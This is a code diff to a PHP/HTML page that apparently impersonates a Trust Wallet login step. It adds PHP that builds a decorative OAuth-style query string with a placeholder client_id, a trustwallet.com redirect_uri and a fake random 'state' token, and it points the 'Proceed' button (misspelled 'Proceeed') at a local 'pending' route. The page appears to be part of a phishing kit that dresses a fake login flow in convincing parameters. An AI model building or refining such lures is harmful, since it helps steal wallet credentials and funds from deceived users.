@@ -1,3 +1,18 @@
+<?php
+// Generate the dynamic URL parameters
+$client_id = "abcdefghijklmnopqrstuvwxyz123456"; // Replace with your 32-character client_id
+$redirect_uri = "https%3A%2F%2Faccount.trustwallet.com%2Foauth-connect";
+$state = "v2.local." . substr(bin2hex(random_bytes(32)), 0, 16) . "." . substr(bin2hex(random_bytes(32)), 16, 48);
+$options = "login%account.trustwallet.com";
+
+// Construct the full URL
+$dynamic_url = "/pending?url=/api/1/login/oauth/provider/pending" .
+    "&client_id=" . $client_id .
+    "&redirect_uri=" . $redirect_uri .
+    "&state=" . $state .
+    "&options=" . $options;
+    
+?>
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -153,7 +168,7 @@
         
        <div class="flex justify-between mt-8 px-2 pb-4">
         <a href=""><button class="px-10 py-2 bg-[#1B1B1C] rounded-3xl text-[#48FF91] border border-[#48FF91]">Cancel</button></a>
-        <a href="clientlogin/"><button class="px-10 py-2 bg-[#48FF91] rounded-3xl text-[#1B1B1C]"> Proceed</button></a>
+        <a href=<?php echo htmlspecialchars($dynamic_url); ?> class="px-10 py-2 bg-[#48FF91] rounded-3xl text-[#1B1B1C]"> Proceeed</a>
        </div>
 
        </div>
